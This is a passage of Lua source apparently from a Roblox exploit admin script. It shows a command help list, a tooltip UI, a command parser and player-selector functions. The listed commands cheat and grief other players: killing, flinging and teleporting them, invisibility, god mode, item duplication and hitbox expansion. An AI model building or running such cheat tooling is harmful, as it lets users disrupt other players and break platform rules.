	CMDs[#CMDs + 1] = {NAME = 'night (CLIENT)', DESC = 'Changes the time to night for the client'}
	CMDs[#CMDs + 1] = {NAME = 'nofog (CLIENT)', DESC = 'Removes fog'}
	CMDs[#CMDs + 1] = {NAME = 'brightness [num] (CLIENT)', DESC = 'Changes the brightness lighting property'}
	CMDs[#CMDs + 1] = {NAME = 'globalshadows / gshadows (CLIENT)', DESC = 'Enables global shadows'}
	CMDs[#CMDs + 1] = {NAME = 'noglobalshadows / nogshadows (CLIENT)', DESC = 'Disables global shadows'}
	CMDs[#CMDs + 1] = {NAME = 'restorelighting / rlighting', DESC = 'Restores Lighting properties'}
	CMDs[#CMDs + 1] = {NAME = 'light [radius] [brightness] (CLIENT)', DESC = 'Gives your player dynamic light'}
	CMDs[#CMDs + 1] = {NAME = 'nolight / unlight', DESC = 'Removes dynamic light from your player'}
	CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
	CMDs[#CMDs + 1] = {NAME = 'inspect / examine [plr]', DESC = 'Opens InspectMenu for a certain player'}
	CMDs[#CMDs + 1] = {NAME = 'age [plr]', DESC = 'Tells you the age of a player'}
	CMDs[#CMDs + 1] = {NAME = 'chatage [plr]', DESC = 'Chats the age of a player'}
	CMDs[#CMDs + 1] = {NAME = 'joindate / jd [plr]', DESC = 'Tells you the date the player joined Roblox'}
	CMDs[#CMDs + 1] = {NAME = 'chatjoindate / cjd [plr]', DESC = 'Chats the date the player joined Roblox'}
	CMDs[#CMDs + 1] = {NAME = 'copyname / copyuser [plr]', DESC = 'Copies a players full username to your clipboard'}
	CMDs[#CMDs + 1] = {NAME = 'userid / id [plr]', DESC = 'Notifies a players user ID'}
	CMDs[#CMDs + 1] = {NAME = 'copyuserid / copyid [plr]', DESC = 'Copies a players user ID to your clipboard'}
	CMDs[#CMDs + 1] = {NAME = 'appearanceid / aid [plr]', DESC = 'Notifies a players appearance ID'}
	CMDs[#CMDs + 1] = {NAME = 'copyappearanceid / caid [plr]', DESC = 'Copies a players appearance ID to your clipboard'}
	CMDs[#CMDs + 1] = {NAME = 'bang [plr] [speed]', DESC = 'owo'}
	CMDs[#CMDs + 1] = {NAME = 'unbang', DESC = 'uwu'}
	CMDs[#CMDs + 1] = {NAME = 'carpet [plr]', DESC = 'Be someones carpet'}
	CMDs[#CMDs + 1] = {NAME = 'uncarpet', DESC = 'Undoes carpet'}
	CMDs[#CMDs + 1] = {NAME = 'friend [plr]', DESC = 'Sends a friend request to certain players'}
	CMDs[#CMDs + 1] = {NAME = 'unfriend [plr]', DESC = 'Unfriends certain players'}
	CMDs[#CMDs + 1] = {NAME = 'headsit [plr]', DESC = 'Sit on a players head'}
	CMDs[#CMDs + 1] = {NAME = 'walkto / follow [plr]', DESC = 'Follow a player'}
	CMDs[#CMDs + 1] = {NAME = 'pathfindwalkto / pathfindfollow [plr]', DESC = 'Follow a player using pathfinding'}
	CMDs[#CMDs + 1] = {NAME = 'unwalkto / unfollow', DESC = 'Stops following a player'}
	CMDs[#CMDs + 1] = {NAME = 'stareat / stare [plr]', DESC = 'Stare / look at a player'}
	CMDs[#CMDs + 1] = {NAME = 'unstareat / unstare [plr]', DESC = 'Disables stareat'}
	CMDs[#CMDs + 1] = {NAME = 'attach [plr] (TOOL)', DESC = 'Attaches you to a player (YOU NEED A TOOL)'}
	CMDs[#CMDs + 1] = {NAME = 'kill [plr] (TOOL)', DESC = 'Kills a player (YOU NEED A TOOL)'}
	CMDs[#CMDs + 1] = {NAME = 'fastkill [plr] (TOOL)', DESC = 'Kills a player (less reliable) (YOU NEED A TOOL)'}
	CMDs[#CMDs + 1] = {NAME = 'handlekill / hkill [plr] (TOOL)', DESC = 'Kills a player using tool damage (YOU NEED A TOOL)'}
	CMDs[#CMDs + 1] = {NAME = 'bring [plr] (TOOL)', DESC = 'Brings a player (YOU NEED A TOOL)'}
	CMDs[#CMDs + 1] = {NAME = 'fastbring [plr] (TOOL)', DESC = 'Brings a player (less reliable) (YOU NEED A TOOL)'}
	CMDs[#CMDs + 1] = {NAME = 'teleport / tp [plr] [plr] (TOOL)', DESC = 'Teleports a player to another player (YOU NEED A TOOL)'}
	CMDs[#CMDs + 1] = {NAME = 'fastteleport / fasttp [plr] [plr] (TOOL)', DESC = 'Teleports a player to another player (less reliable) (YOU NEED A TOOL)'}
	CMDs[#CMDs + 1] = {NAME = 'fling', DESC = 'Flings anyone you touch'}
	CMDs[#CMDs + 1] = {NAME = 'unfling', DESC = 'Disables the fling command'}
	CMDs[#CMDs + 1] = {NAME = 'invisfling', DESC = 'Enables invisible fling'}
	CMDs[#CMDs + 1] = {NAME = 'loopoof', DESC = 'Loops everyones character sounds (everyone can hear)'}
	CMDs[#CMDs + 1] = {NAME = 'unloopoof', DESC = 'Stops the oof chaos'}
	CMDs[#CMDs + 1] = {NAME = 'muteboombox [plr]', DESC = 'Mutes someones boombox'}
	CMDs[#CMDs + 1] = {NAME = 'unmuteboombox [plr]', DESC = 'Unmutes someones boombox'}
	CMDs[#CMDs + 1] = {NAME = 'unloopoof', DESC = 'Stops the oof chaos'}
	CMDs[#CMDs + 1] = {NAME = 'hitbox [plr] [size]', DESC = 'Expands the hitbox for players heads (default is 1)'}
	CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
	CMDs[#CMDs + 1] = {NAME = 'reset', DESC = 'Resets your character normally'}
	CMDs[#CMDs + 1] = {NAME = 'respawn', DESC = 'Respawns you'}
	CMDs[#CMDs + 1] = {NAME = 'refresh / re', DESC = 'Respawns and brings you back to the same position'}
	CMDs[#CMDs + 1] = {NAME = 'god', DESC = 'Makes your character difficult to kill in most games'}
	CMDs[#CMDs + 1] = {NAME = 'invisible / invis', DESC = 'Makes you invisible to other players'}
	CMDs[#CMDs + 1] = {NAME = 'visible / vis', DESC = 'Makes you visible to other players'}
	CMDs[#CMDs + 1] = {NAME = 'toolinvisible / toolinvis / tinvis', DESC = 'Makes you invisible to other players and able to use tools'}
	CMDs[#CMDs + 1] = {NAME = 'speed / ws [num]', DESC = 'Change your walkspeed'}
	CMDs[#CMDs + 1] = {NAME = 'loopspeed / loopws [num]', DESC = 'Loops your walkspeed'}
	CMDs[#CMDs + 1] = {NAME = 'unloopspeed / unloopws', DESC = 'Turns off loopspeed'}
	CMDs[#CMDs + 1] = {NAME = 'hipheight / hheight [num]', DESC = 'Adjusts hip height'}
	CMDs[#CMDs + 1] = {NAME = 'jumppower / jpower / jp [num]', DESC = 'Change a players jump height'}
	CMDs[#CMDs + 1] = {NAME = 'loopjumppower / loopjp [num]', DESC = 'Loops your jump height'}
	CMDs[#CMDs + 1] = {NAME = 'unloopjumppower / unloopjp [num]', DESC = 'Turns off loopjumppower'}
	CMDs[#CMDs + 1] = {NAME = 'maxslopeangle / msa [num]', DESC = 'Adjusts MaxSlopeAngle'}
	CMDs[#CMDs + 1] = {NAME = 'gravity / grav [num] (CLIENT)', DESC = 'Change your gravity'}
	CMDs[#CMDs + 1] = {NAME = 'sit', DESC = 'Makes your character sit'}
	CMDs[#CMDs + 1] = {NAME = 'sitwalk', DESC = 'Makes your character sit while still being able to walk'}
	CMDs[#CMDs + 1] = {NAME = 'nosit', DESC = 'Prevents your character from sitting'}
	CMDs[#CMDs + 1] = {NAME = 'unnosit', DESC = 'Disables nosit'}
	CMDs[#CMDs + 1] = {NAME = 'jump', DESC = 'Makes your character jump'}
	CMDs[#CMDs + 1] = {NAME = 'infinitejump / infjump', DESC = 'Allows you to jump before hitting the ground'}
	CMDs[#CMDs + 1] = {NAME = 'uninfinitejump / uninfjump', DESC = 'Disables infjump'}
	CMDs[#CMDs + 1] = {NAME = 'flyjump', DESC = 'Allows you to hold space to fly up'}
	CMDs[#CMDs + 1] = {NAME = 'unflyjump', DESC = 'Disables flyjump'}
	CMDs[#CMDs + 1] = {NAME = 'autojump / ajump', DESC = 'Automatically jumps when you run into an object'}
	CMDs[#CMDs + 1] = {NAME = 'unautojump / unajump', DESC = 'Disables autojump'}
	CMDs[#CMDs + 1] = {NAME = 'edgejump / ejump', DESC = 'Automatically jumps when you get to the edge of an object'}
	CMDs[#CMDs + 1] = {NAME = 'unedgejump / unejump', DESC = 'Disables edgejump'}
	CMDs[#CMDs + 1] = {NAME = 'platformstand / stun', DESC = 'Enables PlatformStand'}
	CMDs[#CMDs + 1] = {NAME = 'unplatformstand / unstun', DESC = 'Disables PlatformStand'}
	CMDs[#CMDs + 1] = {NAME = 'norotate / noautorotate', DESC = 'Disables AutoRotate'}
	CMDs[#CMDs + 1] = {NAME = 'unnorotate / autorotate', DESC = 'Enables AutoRotate'}
	CMDs[#CMDs + 1] = {NAME = 'enablestate [StateType]', DESC = 'Enables a humanoid state type'}
	CMDs[#CMDs + 1] = {NAME = 'disablestate [StateType]', DESC = 'Disables a humanoid state type'}
	CMDs[#CMDs + 1] = {NAME = 'team [team name] (CLIENT)', DESC = 'Changes your team. Sometimes fools localscripts.'}
	CMDs[#CMDs + 1] = {NAME = 'nobillboardgui / nobgui / noname', DESC = 'Removes billboard and surface guis from your players (i.e. name guis at cafes)'}
	CMDs[#CMDs + 1] = {NAME = 'loopnobgui / loopnoname', DESC = 'Loop removes billboard and surface guis from your players (i.e. name guis at cafes)'}
	CMDs[#CMDs + 1] = {NAME = 'unloopnobgui / unloopnoname', DESC = 'Disables loopnobgui'}
	CMDs[#CMDs + 1] = {NAME = 'nohead / headless', DESC = 'Removes your head (uses simulation radius)'}
	CMDs[#CMDs + 1] = {NAME = 'noarms', DESC = 'Removes your arms'}
	CMDs[#CMDs + 1] = {NAME = 'nolegs', DESC = 'Removes your legs'}
	CMDs[#CMDs + 1] = {NAME = 'nolimbs', DESC = 'Removes your limbs'}
	CMDs[#CMDs + 1] = {NAME = 'naked', DESC = 'Removes your clothing'}
	CMDs[#CMDs + 1] = {NAME = 'noface / removeface', DESC = 'Removes your face'}
	CMDs[#CMDs + 1] = {NAME = 'blockhead', DESC = 'Turns your head into a block'}
	CMDs[#CMDs + 1] = {NAME = 'blockhats', DESC = 'Turns your hats into blocks'}
	CMDs[#CMDs + 1] = {NAME = 'blocktool', DESC = 'Turns the currently selected tool into a block'}
	CMDs[#CMDs + 1] = {NAME = 'creeper', DESC = 'Makes you look like a creeper'}
	CMDs[#CMDs + 1] = {NAME = 'drophats', DESC = 'Drops your hats'}
	CMDs[#CMDs + 1] = {NAME = 'nohats / deletehats / rhats', DESC = 'Deletes your hats'}
	CMDs[#CMDs + 1] = {NAME = 'hatspin / spinhats', DESC = 'Spins your characters accessories'}
	CMDs[#CMDs + 1] = {NAME = 'unhatspin / unspinhats', DESC = 'Undoes spinhats'}
	CMDs[#CMDs + 1] = {NAME = 'clearhats / cleanhats', DESC = 'Clears hats in the workspace'}
	CMDs[#CMDs + 1] = {NAME = 'chardelete / cd [instance name]', DESC = 'Removes any part with a certain name from your character'}
	CMDs[#CMDs + 1] = {NAME = 'chardeleteclass / cdc [class name]', DESC = 'Removes any part with a certain classname from your character'}
	CMDs[#CMDs + 1] = {NAME = 'deletevelocity / dv / removeforces', DESC = 'Removes any velocity / force instances in your character'}
	CMDs[#CMDs + 1] = {NAME = 'weaken [num]', DESC = 'Makes your character less dense'}
	CMDs[#CMDs + 1] = {NAME = 'unweaken', DESC = 'Sets your characters CustomPhysicalProperties to default'}
	CMDs[#CMDs + 1] = {NAME = 'strengthen [num]', DESC = 'Makes your character more dense (CustomPhysicalProperties)'}
	CMDs[#CMDs + 1] = {NAME = 'unstrengthen', DESC = 'Sets your characters CustomPhysicalProperties to default'}
	CMDs[#CMDs + 1] = {NAME = 'breakvelocity', DESC = 'Sets your characters velocity to 0'}
	CMDs[#CMDs + 1] = {NAME = 'spin [speed]', DESC = 'Spins your character'}
	CMDs[#CMDs + 1] = {NAME = 'unspin', DESC = 'Disables spin'}
	CMDs[#CMDs + 1] = {NAME = 'split', DESC = 'Splits your character in half'}
	CMDs[#CMDs + 1] = {NAME = 'nilchar', DESC = 'Sets your characters parent to nil'}
	CMDs[#CMDs + 1] = {NAME = 'unnilchar / nonilchar', DESC = 'Sets your characters parent to workspace'}
	CMDs[#CMDs + 1] = {NAME = 'noroot / removeroot / rroot', DESC = 'Removes your characters HumanoidRootPart'}
	CMDs[#CMDs + 1] = {NAME = 'replaceroot', DESC = 'Replaces your characters HumanoidRootPart'}
	CMDs[#CMDs + 1] = {NAME = 'clearcharappearance / clearchar / clrchar', DESC = 'Removes all accessory, shirt, pants, charactermesh, and bodycolors'}
	CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
	CMDs[#CMDs + 1] = {NAME = 'animation / anim [ID] [speed]', DESC = 'Makes your character perform an animation (must be by roblox to replicate)'}
	CMDs[#CMDs + 1] = {NAME = 'dance', DESC = 'Makes you  d a n c e'}
	CMDs[#CMDs + 1] = {NAME = 'undance', DESC = 'Stops dance animations'}
	CMDs[#CMDs + 1] = {NAME = 'spasm', DESC = 'Makes you  c r a z y'}
	CMDs[#CMDs + 1] = {NAME = 'unspasm', DESC = 'Stops spasm'}
	CMDs[#CMDs + 1] = {NAME = 'headthrow', DESC = 'Simply makes you throw your head'}
	CMDs[#CMDs + 1] = {NAME = 'noanim', DESC = 'Disables your animations'}
	CMDs[#CMDs + 1] = {NAME = 'reanim', DESC = 'Restores your animations'}
	CMDs[#CMDs + 1] = {NAME = 'animspeed [num]', DESC = 'Changes the speed of your current animation'}
	CMDs[#CMDs + 1] = {NAME = 'copyanimation / copyanim / copyemote [plr]', DESC = 'Copies someone elses animation'}
	CMDs[#CMDs + 1] = {NAME = 'loopanimation / loopanim', DESC = 'Loops your current animation'}
	CMDs[#CMDs + 1] = {NAME = 'stopanimations / stopanims', DESC = 'Stops running animations'}
	CMDs[#CMDs + 1] = {NAME = 'refreshanimations / refreshanims / reanim', DESC = 'Refreshes animations'}
	CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
	CMDs[#CMDs + 1] = {NAME = 'autoclick [click delay] [release delay]', DESC = 'Automatically clicks your mouse with a set delay'}
	CMDs[#CMDs + 1] = {NAME = 'unautoclick / noautoclick', DESC = 'Turns off autoclick'}
	CMDs[#CMDs + 1] = {NAME = 'autokeypress [key] [down delay] [up delay]', DESC = 'Automatically presses a key with a set delay'}
	CMDs[#CMDs + 1] = {NAME = 'unautokeypress', DESC = 'Stops autokeypress'}
	CMDs[#CMDs + 1] = {NAME = 'hovername', DESC = 'Shows a players username when your mouse is hovered over them'}
	CMDs[#CMDs + 1] = {NAME = 'unhovername / nohovername', DESC = 'Turns off hovername'}
	CMDs[#CMDs + 1] = {NAME = 'mousesensitivity / ms [0-10]', DESC = 'Sets your mouse sensitivity (affects first person and right click drag) (default is 1)'}
	CMDs[#CMDs + 1] = {NAME = 'clickdelete', DESC = 'Go to settings>Keybinds>Add for clicktp'}
	CMDs[#CMDs + 1] = {NAME = 'clickteleport', DESC = 'Go to settings>Keybinds>Add for click tp'}
	CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
	CMDs[#CMDs + 1] = {NAME = 'tools', DESC = 'Copies tools from ReplicatedStorage and Lighting'}
	CMDs[#CMDs + 1] = {NAME = 'notools / removetools / deletetools', DESC = 'Removes tools from character and backpack'}
	CMDs[#CMDs + 1] = {NAME = 'deleteselectedtool / dst', DESC = 'Removes any currently selected tools'}
	CMDs[#CMDs + 1] = {NAME = 'grabtools', DESC = 'Automatically get tools that are dropped'}
	CMDs[#CMDs + 1] = {NAME = 'ungrabtools / nograbtools', DESC = 'Disables grabtools'}
	CMDs[#CMDs + 1] = {NAME = 'copytools [plr] (CLIENT)', DESC = 'Copies a players tools'}
	CMDs[#CMDs + 1] = {NAME = 'dupetools / clonetools [num]', DESC = 'Duplicates your inventory tools a set ammount of times'}
	CMDs[#CMDs + 1] = {NAME = 'droptools', DESC = 'Drops your tools'}
	CMDs[#CMDs + 1] = {NAME = 'droppabletools', DESC = 'Makes your tools droppable'}
	CMDs[#CMDs + 1] = {NAME = 'equiptools', DESC = 'Equips every tool in your inventory at once'}
	CMDs[#CMDs + 1] = {NAME = 'reach [num]', DESC = 'Increases the hitbox of your held tool'}
	CMDs[#CMDs + 1] = {NAME = 'unreach / noreach', DESC = 'Turns off reach'}
	CMDs[#CMDs + 1] = {NAME = 'grippos [X Y Z]', DESC = 'Changes your current tools grip position'}
	CMDs[#CMDs + 1] = {NAME = 'usetools [ammount] [delay]', DESC = 'Activates all tools in your backpack at the same time'}
	CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
	CMDs[#CMDs + 1] = {NAME = 'addalias [cmd] [alias]', DESC = 'Adds an alias to a command'}
	CMDs[#CMDs + 1] = {NAME = 'removealias [alias]', DESC = 'Removes a custom alias'}
	CMDs[#CMDs + 1] = {NAME = 'clraliases', DESC = 'Removes all custom aliases'}
	CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
	CMDs[#CMDs + 1] = {NAME = 'addplugin / plugin [name]', DESC = 'Add a plugin via command'}
	CMDs[#CMDs + 1] = {NAME = 'removeplugin / deleteplugin [name]', DESC = 'Remove a plugin via command'}
	CMDs[#CMDs + 1] = {NAME = 'reloadplugin [name]', DESC = 'Reloads a plugin'}
	CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
	CMDs[#CMDs + 1] = {NAME = 'breakloops / break (cmd loops)', DESC = 'Stops any cmd loops (;100^1^cmd)'}
	CMDs[#CMDs + 1] = {NAME = 'removecmd / deletecmd', DESC = 'Removes a command until the admin is reloaded'}
	CMDs[#CMDs + 1] = {NAME = 'tpwalk / teleportwalk', DESC = 'Teleports you to your move direction'}
	CMDs[#CMDs + 1] = {NAME = 'untpwalk / unteleportwalk', DESC = 'Undoes tpwalk / teleportwalk'}
	wait()

	for i = 1, #CMDs do
		local newcmd = Example:Clone()
		newcmd.Parent = CMDsF
		newcmd.Visible = false
		newcmd.Text = CMDs[i].NAME
		newcmd.Name = 'CMD'
		table.insert(text1,newcmd)
		if CMDs[i].DESC ~= '' then
			local title = Instance.new("StringValue")
			title.Name = "Title"
			title.Parent = newcmd
			title.Value = CMDs[i].NAME
			local desc = Instance.new("StringValue")
			desc.Name = "Desc"
			desc.Parent = newcmd
			desc.Value = CMDs[i].DESC
			newcmd.MouseButton1Down:Connect(function()
				if newcmd.Visible and newcmd.TextTransparency == 0 then
					local currentText = Cmdbar.Text
					Cmdbar:CaptureFocus()
					autoComplete(newcmd.Text,currentText)
					maximizeHolder()
				end
			end)
		end
	end

	IndexContents('',true)

	function getText(object)
		if object ~= nil then
			if object:FindFirstChild('Desc') ~= nil then
				return {object.Desc.Value, object:FindFirstChild('Title')}
			elseif object.Parent:FindFirstChild('Desc') ~= nil then
				return {object.Parent.Desc.Value, object.Parent:FindFirstChild('Title')}
			end
		end
		return nil
	end

	function checkTT()
		local t
		local guisAtPosition = COREGUI:GetGuiObjectsAtPosition(IYMouse.X, IYMouse.Y)

		for _, gui in pairs(guisAtPosition) do
			if gui.Parent == CMDsF then
				t = gui
			end
		end

		if t ~= nil then
			local gt = getText(t)
			if gt ~= nil then
				local x = IYMouse.X
				local y = IYMouse.Y
				local xP
				local yP
				if IYMouse.X > 200 then
					xP = x - 201
				else
					xP = x + 21
				end
				if IYMouse.Y > (IYMouse.ViewSizeY-96) then
					yP = y - 97
				else
					yP = y
				end
				Tooltip.Position = UDim2.new(0, xP, 0, yP)
				Description.Text = gt[1]
				if gt[2] ~= nil then
					Title_3.Text = gt[2].Value
				else
					Title_3.Text = ''
				end
				Tooltip.Visible = true
			else
				Tooltip.Visible = false
			end
		else
			Tooltip.Visible = false
		end
	end

	function FindInTable(tbl,val)
		if tbl == nil then return false end
		for _,v in pairs(tbl) do
			if v == val then return true end
		end 
		return false
	end

	function GetInTable(Table, Name)
		for i = 1, #Table do
			if Table[i] == Name then
				return i
			end
		end
		return false
	end

	function respawn(plr)
		if invisRunning then TurnVisible() end
		local char = plr.Character
		if char:FindFirstChildOfClass("Humanoid") then char:FindFirstChildOfClass("Humanoid"):ChangeState(15) end
		char:ClearAllChildren()
		local newChar = Instance.new("Model")
		newChar.Parent = workspace
		plr.Character = newChar
		wait()
		plr.Character = char
		newChar:Destroy()
	end

	local refreshCmd = false
	function refresh(plr)
		refreshCmd = true
		local Human = plr.Character and plr.Character:FindFirstChildOfClass("Humanoid", true)
		local pos = Human and Human.RootPart and Human.RootPart.CFrame
		local pos1 = workspace.CurrentCamera.CFrame
		respawn(plr)
		spawn(function()
			plr.CharacterAdded:Wait():WaitForChild("Humanoid").RootPart.CFrame, workspace.CurrentCamera.CFrame = pos, wait() and pos1
			refreshCmd = false
		end)
	end

	local lastDeath

	function onDied()
		spawn(function()
			if pcall(function() Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid') end) and Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid') then
				Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid').Died:Connect(function()
					if getRoot(Players.LocalPlayer.Character) then
						lastDeath = getRoot(Players.LocalPlayer.Character).CFrame
					end
				end)
			else
				wait(2)
				onDied()
			end
		end)
	end

	Clip = true
	spDelay = 0.1
	Players.LocalPlayer.CharacterAdded:Connect(function()
		NOFLY()
		Floating = false

		if not Clip then
			execCmd('clip nonotify')
		end

		repeat wait() until getRoot(Players.LocalPlayer.Character)

		pcall(function()
			if spawnpoint and not refreshCmd and spawnpos ~= nil then
				wait(spDelay)
				getRoot(Players.LocalPlayer.Character).CFrame = spawnpos
			end
		end)

		onDied()
	end)

	onDied()

	function getstring(begin)
		local start = begin-1
		local AA = '' for i,v in pairs(cargs) do
			if i > start then
				if AA ~= '' then
					AA = AA .. ' ' .. v
				else
					AA = AA .. v
				end
			end
		end
		return AA
	end

	findCmd=function(cmd_name)
		for i,v in pairs(cmds)do
			if v.NAME:lower()==cmd_name:lower() or FindInTable(v.ALIAS,cmd_name:lower()) then
				return v
			end
		end
		return customAlias[cmd_name:lower()]
	end

	function splitString(str,delim)
		local broken = {}
		if delim == nil then delim = "," end
		for w in string.gmatch(str,"[^"..delim.."]+") do
			table.insert(broken,w)
		end
		return broken
	end

	cmdHistory = {}
	local lastCmds = {}
	local historyCount = 0
	local split=" "
	local lastBreakTime = 0
	function execCmd(cmdStr,speaker,store)
		cmdStr = cmdStr:gsub("%s+$","")
		spawn(function()
			local rawCmdStr = cmdStr
			cmdStr = string.gsub(cmdStr,"\\\\","%%BackSlash%%")
			local commandsToRun = splitString(cmdStr,"\\")
			for i,v in pairs(commandsToRun) do
				v = string.gsub(v,"%%BackSlash%%","\\")
				local x,y,num = v:find("^(%d+)%^")
				local cmdDelay = 0
				local infTimes = false
				if num then
					v = v:sub(y+1)
					local x,y,del = v:find("^([%d%.]+)%^")
					if del then
						v = v:sub(y+1)
						cmdDelay = tonumber(del) or 0
					end
				else
					local x,y = v:find("^inf%^")
					if x then
						infTimes = true
						v = v:sub(y+1)
						local x,y,del = v:find("^([%d%.]+)%^")
						if del then
							v = v:sub(y+1)
							del = tonumber(del) or 1
							cmdDelay = (del > 0 and del or 1)
						else
							cmdDelay = 1
						end
					end
				end
				num = tonumber(num or 1)

				if v:sub(1,1) == "!" then
					local chunks = splitString(v:sub(2),split)
					if chunks[1] and lastCmds[chunks[1]] then v = lastCmds[chunks[1]] end
				end

				local args = splitString(v,split)
				local cmdName = args[1]
				local cmd = findCmd(cmdName)
				if cmd then
					table.remove(args,1)
					cargs = args
					if not speaker then speaker = Players.LocalPlayer end
					if store then
						if speaker == Players.LocalPlayer then
							if cmdHistory[1] ~= rawCmdStr and rawCmdStr:sub(1,11) ~= 'lastcommand' and rawCmdStr:sub(1,7) ~= 'lastcmd' then
								table.insert(cmdHistory,1,rawCmdStr)
							end
						end
						if #cmdHistory > 30 then table.remove(cmdHistory) end

						lastCmds[cmdName] = v
					end
					local cmdStartTime = tick()
					if infTimes then
						while lastBreakTime < cmdStartTime do
							local success,err = pcall(cmd.FUNC,args, speaker)
							if not success and _G.IY_DEBUG then
								warn("Command Error:", cmdName, err)
							end
							wait(cmdDelay)
						end
					else
						for rep = 1,num do
							if lastBreakTime > cmdStartTime then break end
							local success,err = pcall(function()
								cmd.FUNC(args, speaker)
							end)
							if not success and _G.IY_DEBUG then
								warn("Command Error:", cmdName, err)
							end
							if cmdDelay ~= 0 then wait(cmdDelay) end
						end
					end
				end
			end
		end)
	end	

	function addcmd(name,alias,func,plgn)
		cmds[#cmds+1]=
			{
				NAME=name;
				ALIAS=alias or {};
				FUNC=func;
				PLUGIN=plgn;
			}
	end

	function removecmd(cmd)
		if cmd ~= " " then
			for i = #cmds,1,-1 do
				if cmds[i].NAME == cmd or FindInTable(cmds[i].ALIAS,cmd) then
					table.remove(cmds, i)
					for a,c in pairs(CMDsF:GetChildren()) do
						if string.find(c.Text, "^"..cmd.."$") or string.find(c.Text, "^"..cmd.." ") or string.find(c.Text, " "..cmd.."$") or string.find(c.Text, " "..cmd.." ") then
							c.TextTransparency = 0.7
							c.MouseButton1Click:Connect(function()
								notify(c.Text, "Command has been disabled by you or a plugin")
							end)
						end
					end
				end
			end
		end
	end

	function addbind(cmd,key,iskeyup)
		binds[#binds+1]=
			{
				COMMAND=cmd;
				KEY=key;
				ISKEYUP=iskeyup;
			}
	end

	function addcmdtext(text,name,desc)
		local newcmd = Example:Clone()
		local tooltipText = tostring(text)
		local tooltipDesc = tostring(desc)
		newcmd.Parent = CMDsF
		newcmd.Visible = false
		newcmd.Text = text
		newcmd.Name = 'PLUGIN_'..name
		table.insert(text1,newcmd)
		if desc and desc ~= '' then
			local title = Instance.new("StringValue")
			title.Name = "Title"
			title.Parent = newcmd
			title.Value = tooltipText
			local desc = Instance.new("StringValue")
			desc.Name = "Desc"
			desc.Parent = newcmd
			desc.Value = tooltipDesc
			newcmd.MouseButton1Down:Connect(function()
				if newcmd.Visible and newcmd.TextTransparency == 0 then
					Cmdbar:CaptureFocus()
					autoComplete(newcmd.Text)
					maximizeHolder()
				end
			end)
		end
	end

	SpecialPlayerCases = {
		["all"] = function(speaker)return Players:GetPlayers() end,
		["others"] = function(speaker)
			local plrs = {}
			for i,v in pairs(Players:GetPlayers()) do
				if v ~= speaker then
					table.insert(plrs,v)
				end
			end
			return plrs
		end,
		["me"] = function(speaker)return {speaker} end,
		["#(%d+)"] = function(speaker,args,currentList)
			local returns = {}
			local randAmount = tonumber(args[1])
			local players = {unpack(currentList)}
			for i = 1,randAmount do
				if #players == 0 then break end
				local randIndex = math.random(1,#players)
				table.insert(returns,players[randIndex])
				table.remove(players,randIndex)
			end
			return returns
		end,
		["random"] = function(speaker,args,currentList)
			local players = currentList
			return {players[math.random(1,#players)]}
		end,
		["%%(.+)"] = function(speaker,args)
			local returns = {}
			local team = args[1]
			for _,plr in pairs(Players:GetPlayers()) do
				if plr.Team and string.sub(string.lower(plr.Team.Name),1,#team) == string.lower(team) then
					table.insert(returns,plr)
				end
			end
			return returns
		end,
		["allies"] = function(speaker)
			local returns = {}
			local team = speaker.Team
			for _,plr in pairs(Players:GetPlayers()) do
				if plr.Team == team then
					table.insert(returns,plr)
				end
			end
			return returns
		end,
		["enemies"] = function(speaker)
			local returns = {}
			local team = speaker.Team
			for _,plr in pairs(Players:GetPlayers()) do
				if plr.Team ~= team then
					table.insert(returns,plr)
				end
			end
			return returns
		end,
		["team"] = function(speaker)
			local returns = {}
			local team = speaker.Team
			for _,plr in pairs(Players:GetPlayers()) do
				if plr.Team == team then
					table.insert(returns,plr)
				end
			end
			return returns
		end,
		["nonteam"] = function(speaker)
			local returns = {}
			local team = speaker.Team
			for _,plr in pairs(Players:GetPlayers()) do
				if plr.Team ~= team then
					table.insert(returns,plr)
				end
			end
			return returns
		end,
		["friends"] = function(speaker,args)
			local returns = {}
			for _,plr in pairs(Players:GetPlayers()) do
				if plr:IsFriendsWith(speaker.UserId) and plr ~= speaker then
					table.insert(returns,plr)
				end
			end
			return returns
		end,
		["nonfriends"] = function(speaker,args)
			local returns = {}
			for _,plr in pairs(Players:GetPlayers()) do
				if not plr:IsFriendsWith(speaker.UserId) and plr ~= speaker then
					table.insert(returns,plr)
				end
			end
			return returns
		end,
		["guests"] = function(speaker,args)
			local returns = {}
			for _,plr in pairs(Players:GetPlayers()) do
				if plr.Guest then
					table.insert(returns,plr)
				end
			end
			return returns
		end,
		["bacons"] = function(speaker,args)
			local returns = {}
			for _,plr in pairs(Players:GetPlayers()) do
				if plr.Character:FindFirstChild('Pal Hair') or plr.Character:FindFirstChild('Kate Hair') then
					table.insert(returns,plr)
				end
			end
			return returns
		end,
		["age(%d+)"] = function(speaker,args)
			local returns = {}
			local age = tonumber(args[1])
			if not age == nil then return end
			for _,plr in pairs(Players:GetPlayers()) do
				if plr.AccountAge <= age then
					table.insert(returns,plr)
				end
			end
			return returns
		end,
		["nearest"] = function(speaker,args,currentList)
			local speakerChar = speaker.Character
			if not speakerChar or not getRoot(speakerChar) then return end
			local lowest = math.huge
			local NearestPlayer = nil
			for _,plr in pairs(currentList) do
				if plr ~= speaker and plr.Character then
					local distance = plr:DistanceFromCharacter(getRoot(speakerChar).Position)
					if distance < lowest then
						lowest = distance
						NearestPlayer = {plr}
					end
				end
			end
			return NearestPlayer
		end,
		["farthest"] = function(speaker,args,currentList)
			local speakerChar = speaker.Character
			if not speakerChar or not getRoot(speakerChar) then return end
			local highest = 0
			local Farthest = nil
			for _,plr in pairs(currentList) do
				if plr ~= speaker and plr.Character then
					local distance = plr:DistanceFromCharacter(getRoot(speakerChar).Position)
					if distance > highest then
						highest = distance
						Farthest = {plr}
					end
				end
			end
			return Farthest
		end,
		["group(%d+)"] = function(speaker,args)
			local returns = {}
			local groupID = tonumber(args[1])
			for _,plr in pairs(Players:GetPlayers()) do
				if plr:IsInGroup(groupID) then  
					table.insert(returns,plr)
				end
			end
			return returns
		end,
